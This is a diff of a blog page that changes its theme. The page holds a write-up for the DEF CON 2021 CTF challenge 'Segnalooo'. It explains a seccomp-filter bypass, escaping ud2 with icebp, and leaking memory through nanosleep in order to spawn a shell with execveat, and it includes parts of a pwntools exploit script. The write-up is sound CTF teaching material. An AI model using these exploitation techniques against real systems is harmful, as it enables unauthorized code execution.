@@ -1,97 +1,82 @@
-<!doctype html>
-<html lang="en"><head>
-    <title>Defcon-2021-Segnalooo</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="" />
+<!DOCTYPE html>
+<html lang="en-us">
 
-    
-    
-    
-    <link rel="stylesheet" href="/css/theme.min.css">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+<meta itemprop="name" content="Defcon-2021-Segnalooo">
+<meta itemprop="description" content="Excute execveat(0, &quot;/bin/sh&quot;, 0, 0, 0) after bypass seccomp filter.
+ Binary Set Signal Handler on Signum 5 ( SIGTRAP ) Allocate Memory twice ( addr1 : 0x10XXXXXXXXXX, addr2 : 0x5XXXXXXXXXXX ) Munmap all Memory except addr1, addr2 Call Signal Handler with int3 After Signal Handler, IP returns to our Shellcode.
+=&gt; There is two Problems. ( Seccomp filter, ud2 instruction )   Seccomp Filter line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0a 0xc000003e if (A !">
+<meta itemprop="datePublished" content="2021-05-06T21:53:09&#43;09:00" />
+<meta itemprop="dateModified" content="2021-05-06T21:53:09&#43;09:00" />
+<meta itemprop="wordCount" content="468">
 
-    
-    
-    
 
-    
+
+<meta itemprop="keywords" content="" /><meta property="og:title" content="Defcon-2021-Segnalooo" />
+<meta property="og:description" content="Excute execveat(0, &quot;/bin/sh&quot;, 0, 0, 0) after bypass seccomp filter.
+ Binary Set Signal Handler on Signum 5 ( SIGTRAP ) Allocate Memory twice ( addr1 : 0x10XXXXXXXXXX, addr2 : 0x5XXXXXXXXXXX ) Munmap all Memory except addr1, addr2 Call Signal Handler with int3 After Signal Handler, IP returns to our Shellcode.
+=&gt; There is two Problems. ( Seccomp filter, ud2 instruction )   Seccomp Filter line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0a 0xc000003e if (A !" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mhibio.github.io/post/defcon-2021-segnalooo/" />
+<meta property="article:published_time" content="2021-05-06T21:53:09+09:00" />
+<meta property="article:modified_time" content="2021-05-06T21:53:09+09:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Defcon-2021-Segnalooo"/>
+<meta name="twitter:description" content="Excute execveat(0, &quot;/bin/sh&quot;, 0, 0, 0) after bypass seccomp filter.
+ Binary Set Signal Handler on Signum 5 ( SIGTRAP ) Allocate Memory twice ( addr1 : 0x10XXXXXXXXXX, addr2 : 0x5XXXXXXXXXXX ) Munmap all Memory except addr1, addr2 Call Signal Handler with int3 After Signal Handler, IP returns to our Shellcode.
+=&gt; There is two Problems. ( Seccomp filter, ud2 instruction )   Seccomp Filter line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0a 0xc000003e if (A !"/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>Defcon-2021-Segnalooo</title>
+	<link rel="stylesheet" href="https://mhibio.github.io/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css" integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin="anonymous">
+	
 </head>
-<body>
-        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
-    <div class="row">
-        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
-            <a href="/" class="text-decoration-none">
-                <img id="home-image" class="rounded-circle"
-                    
-                        
-                            src="/images/zzlol.jpg"
-                        
-                    
-                />
-            </a>
-        </div>
-        <div class="col-sm-8 col-12 text-sm-left text-center">
-            <h2 class="m-0 mb-2 mt-4">
-                <a href="/" class="text-decoration-none">
-                    
-                        mhibio
-                    
-                </a>
-            </h2>
-            <p class="text-muted mb-1">
-                
-                    Pwn For Fun
-                
-            </p>
-            <ul id="nav-links" class="list-inline mb-2">
-                
-                
-                    <li class="list-inline-item">
-                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="post/" title="">Posts</a>
-                    </li>
-                
-                    <li class="list-inline-item">
-                        <a class="badge badge-white " style="font-size: 14px; padding: 0;" href="whoami" title="">About</a>
-                    </li>
-                
-            </ul>
-            <ul id="nav-social" class="list-inline">
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="" target="_blank">
-                            <i class=" text-muted"></i>
-                        </a>
-                    </li>
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="" target="_blank">
-                            <i class=" text-muted"></i>
-                        </a>
-                    </li>
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="" target="_blank">
-                            <i class=" text-muted"></i>
-                        </a>
-                    </li>
-                
-            </ul>
-        </div>
-    </div>
-    <hr />
-</header>
-<div class="container">
-    <div class="pl-sm-2">
-        <div class="mb-3">
-            <h3 class="mb-0">Defcon-2021-Segnalooo</h3>
-            
-            <small class="text-muted">Published May 6, 2021</small>
-        </div>
 
-        <article>
-            <p>Excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code> after bypass seccomp filter.</p>
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://mhibio.github.io">Mhibio&#39;s Blog</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://mhibio.github.io/post/">Posts</a>
+				<a href="https://mhibio.github.io/whoami">About</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://twitter.com/" target="_blank" rel="noopener me" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a><a href="https://instagram.com/" target="_blank" rel="noopener me" title="Instagram"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line></svg></a><a href="https://github.com/mhibio" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://mhibio.github.io/post/">Posts</a></li>
+			<li><a href="https://mhibio.github.io/whoami">About</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner thin animated fadeIn faster">
+		<h1>Defcon-2021-Segnalooo</h1>
+		<div class="content">
+			<p>Excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code> after bypass seccomp filter.</p>
 <hr>
-<h3 id="binary">Binary</h3>
+<h3 id="binary">Binary<a href="#binary" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <ol start="0">
 <li>Set Signal Handler on Signum 5 ( <code>SIGTRAP</code> )</li>
 <li>Allocate Memory twice ( addr1 : <code>0x10XXXXXXXXXX</code>, addr2 : <code>0x5XXXXXXXXXXX</code> )</li>
@@ -101,7 +86,7 @@
 =&gt; There is two Problems. ( Seccomp filter, <code>ud2</code> instruction )</li>
 </ol>
 <hr>
-<h3 id="seccomp-filter">Seccomp Filter</h3>
+<h3 id="seccomp-filter">Seccomp Filter<a href="#seccomp-filter" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"> <span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
 <span class="o">=================================</span>
  <span class="mo">0000</span><span class="p">:</span> <span class="mh">0x20</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
@@ -128,20 +113,20 @@ or, <code>Instruction_Pointer(IP)</code> have to be smaller than 0x80000000</p>
 <p>So we can bypass <strong>Ip check</strong> by using a syscall gadget in <code>0x10XXXXXXXXXX</code>.<br>
 ( 4 bytes of addr2 <code>0x10XXXXXXXXXX</code> are always smaller than <code>0x80000000</code>. ).</p>
 <hr>
-<h3 id="ud2-instruction">ud2 instruction</h3>
+<h3 id="ud2-instruction">ud2 instruction<a href="#ud2-instruction" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p><code>ud2 instruction</code> means undefined instruction.<br>
 when <code>IP</code> returns to our shellcode, <code>ud2</code> instruction is executed.<br>
 -&gt; Process stopped with exit code -4 ( <code>SIGILL</code> )<br>
 But, I can execute only 1 instruction.<br>
 <strong>if I execute <code>icebp</code>, I can escape <code>ud2</code> instruction.</strong></p>
 <hr>
-<h3 id="leak-memory">leak memory</h3>
+<h3 id="leak-memory">leak memory<a href="#leak-memory" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <p>if <code>nanosleep's rdi</code> is invalid memory, return <code>0xfffffffffffffff2</code>.<br>
 else <code>nanosleep's rdi</code> is valid memory but failed <code>nanosleep</code>, return <code>0xffffffffffffffea</code>.</p>
 <p>so we can leak memory <code>0x10XXXXXXXXXX</code><br>
 then, just excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code></p>
 <hr>
-<h3 id="exploit">Exploit</h3>
+<h3 id="exploit">Exploit<a href="#exploit" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
 <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
@@ -191,21 +176,23 @@ then, just excute <code>execveat(0, &quot;/bin/sh&quot;, 0, 0, 0)</code></p>
             <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
             <span class="nb">exit</span><span class="p">()</span>
 </code></pre></div><hr>
-<h2 id="flag--ooos3riouslywh4tissigaltstack">Flag : OOO{s3riously,wh4tISsigaltstack???}</h2>
+<h2 id="flag--ooos3riouslywh4tissigaltstack">Flag : OOO{s3riously,wh4tISsigaltstack???}<a href="#flag--ooos3riouslywh4tissigaltstack" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
 
-        </article>
-    </div>
+		</div>
+	</main>
 
-            </div>
-        </div><footer class="text-center pb-1">
-    <small class="text-muted">
-        
-            This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.
-        
-        <br>
-        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
-        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
-    </small>
-</footer>
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2021 <a href="https://mhibio.github.io">mhibio</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://mhibio.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://mhibio.github.io/js/bundle.min.4a9a0ac3d2217822c7865b4161e6c2a71de1d70492264337755427898dd718f6.js" integrity="sha256-SpoKw9IheCLHhltBYebCpx3h1wSSJkM3dVQniY3XGPY=" crossorigin="anonymous"></script>
+	
+
 </body>
+
 </html>
